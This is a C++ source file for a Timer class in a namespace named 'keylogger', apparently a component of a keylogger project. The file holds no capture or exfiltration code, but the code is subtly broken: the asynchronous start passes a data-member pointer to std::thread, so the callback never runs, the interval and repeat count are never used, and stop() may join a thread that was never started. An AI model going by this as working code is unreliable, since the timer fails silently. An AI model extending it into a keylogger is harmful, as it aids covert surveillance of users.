#include "Timer.h"

namespace keylogger
{
Timer::Timer(std::function<void(void)> f) : callback{std::move(f)} {}
Timer::Timer(std::function<void(void)> f, unsigned long i, long repeat)
    : callback{std::move(f)}, interval{std::chrono::milliseconds(i)}, totalNumberOfCalls{repeat}
{
}

void Timer::start(bool async)
{
    if (isAlive())
    {
        return;
    }
    alive = true;
    callsCounter = totalNumberOfCalls;
    if (async)
    {
        thread = std::thread(&Timer::callback, this);
    }
    else
    {
        callback();
    }
}

void Timer::stop()
{
    alive = false;
    thread.join();
}

bool Timer::isAlive() const
{
    return alive;
}

void Timer::setTimerCallback(const std::function<void(void)>& f)
{
    callback = f;
}

void Timer::setTotalNumberOfCalls(long num)
{
    if (isAlive())
    {
        return;
    }
    totalNumberOfCalls = num;
}

void Timer::setInterval(unsigned long i)
{
    if (isAlive())
    {
        return;
    }
    interval = std::chrono::milliseconds(i);
}
}
